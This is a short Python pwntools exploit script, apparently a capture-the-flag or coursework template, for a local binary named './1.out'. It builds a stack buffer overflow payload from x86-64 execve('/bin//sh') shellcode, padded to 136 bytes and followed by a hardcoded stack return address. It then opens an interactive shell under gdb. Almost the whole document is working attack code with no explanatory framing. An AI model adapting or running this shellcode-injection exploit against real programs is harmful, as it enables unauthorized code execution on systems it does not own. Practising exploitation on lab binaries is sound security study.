#!/usr/bin/env python3

from pwn import *
import os

# -----------------------
# Config
# -----------------------
BIN_PATH = "./1.out"  # change me
context.binary = ELF(BIN_PATH, checksec=True)

context.log_level = "info"
context.terminal = ["tmux", "splitw", "-h"]

gdbscript = """
# adjust breakpoints for your binary:
break *main
#break *hello_routine+192
# break *vuln
# continue
"""

"""
p.sendlineafter(b'>', b'something') - send a line after receiving something
p.sendline(b'something') - just send a line
p64(<int>) - pack into 8-byte int
out = p.recvline() - store line of output in variable
"""

# p = process(BIN_PATH) # use me once debugged
p = gdb.debug(BIN_PATH, gdbscript)

# your code here
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline(shellcode + b"A" * (136 - len(shellcode)) + p64(0x7FFFFFFFE2D0))

p.interactive()
